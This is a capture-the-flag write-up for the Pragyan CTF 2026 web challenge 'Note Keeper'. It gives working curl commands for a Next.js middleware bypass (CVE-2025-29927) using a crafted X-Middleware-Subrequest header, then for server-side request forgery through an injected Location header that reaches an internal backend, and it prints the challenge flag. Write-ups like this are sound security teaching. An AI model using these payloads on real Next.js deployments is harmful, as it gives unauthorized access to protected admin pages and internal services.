# Note Keeper - Pragyan CTF  
| Field | Value |
|-------|--------|
| **CTF** | Pragyan CTF 2026 |
| **Category** | Web |
---

## Challenge Description

> Once upon a time, I built a simple application to manage personal notes. I've made it available for you too.
>
>Can you reach what you’re not supposed to?

The application has:
- A guest-facing notes page (`/`)
- A login page (`/login`)
- A middleware-protected admin panel (`/admin`)

---

## Step 1: Reconnaissance

Visiting the application shows a **Login** link:`/login?state=L2FkbWlu`

Decoding the Base64 state parameter:`L2FkbWlu → /admin`


Directly accessing `/admin` returns:

```html
<!--Request Forbidden by Next.js 15.1.1 Middleware-->
```
#### This reveals:

- The app uses Next.js 15.1.1
- Authorization is enforced only via middleware

## Step 2: Middleware Bypass (CVE-2025-29927)

Next.js versions up to 15.2.2 are vulnerable to CVE-2025-29927, which allows skipping middleware execution by abusing the X-Middleware-Subrequest header.

For Next.js 15.x, the middleware name must be repeated due to recursion depth limits.

### Exploit

```
curl https://note-keeper.ctf.prgy.in/admin \
  -H "X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"

```
#### Result

The admin panel loads successfully, revealing:

- Admin stats
- Internal notes
- Backend hints

## Step 3: Admin Panel Analysis

The admin notes contain two critical hints:

1. A Pastebin link containing the middleware source code
2. A Base64 string:
`WyIvc3RhdHMiLCAiL25vdGVzIiwgIi9mbGFnIiwgIi8iXQ==`

Decoding it:
`["/stats", "/notes", "/flag", "/"]`

## Step 4: Analyzing the Middleware Source

The Pastebin reveals the middleware code:`https://pastebin.com/GNQ36Hn4`

```
import { NextResponse } from "next/server";
import { isAdminFunc } from "./lib/auth";

export function middleware(request) {
  const url = request.nextUrl.clone();

  if (url.pathname.startsWith('/admin')) {
    const isAdmin = isAdminFunc(request);
    if (!isAdmin) {
      return new NextResponse("Unauthorized", { status: 401 });
    }
  }

  if (url.pathname.startsWith('/api')) {
    return NextResponse.next({
      headers: request.headers
    });
  }

  return NextResponse.next();
}

```

### Critical Observation

For /api/* routes, all request headers are blindly forwarded into the response:

`NextResponse.next({ headers: request.headers })`

This is extremely dangerous.

## Step 5: Discovering the Internal Backend

From browser console errors on the admin page:
Blocked loading mixed active content `http://backend:4000/stats`
This reveals:

- There is an internal backend service
- It runs at `http://backend:4000`
- It exposes /stats and /flag
- It is not directly accessible externally

## Step 6: Understanding the Missing Link

Key realization:

- We cannot access backend:4000 directly (internal hostname)
- Path tricks (/api/backend:4000/flag, /../flag) do not change the host
- Host / **X-Forwarded-** headers only describe metadata
- We need something that makes the server itself perform a request

That primitive is the **Location** header.

## Step 7: SSRF via Location Header Injection
#### Why `Location` Works

- Location is a control header, not metadata

- When present in a response, frameworks interpret it as:
  - A redirect
  - A resource transition
- Because the middleware copies user-supplied headers into the response, we can inject it

This causes server-side request forgery (SSRF).

## Step 8: Exploitation

We send a request to any /api/* route (auth-free) and inject a Location header pointing to the internal backend.

Final Exploit
```
curl https://note-keeper.ctf.prgy.in/api/login \
  -H "Location: http://backend:4000/flag"

```

#### What Happens Internally

1. Middleware forwards request headers into response
2. Next.js sees Location in the response
3. The server fetches `http://backend:4000/flag`
4. The response body is returned to the client

## Flag 
`p_ctf{Ju$t_u$e_VITE_e111d821}`

PWN by  **W4RR1OR**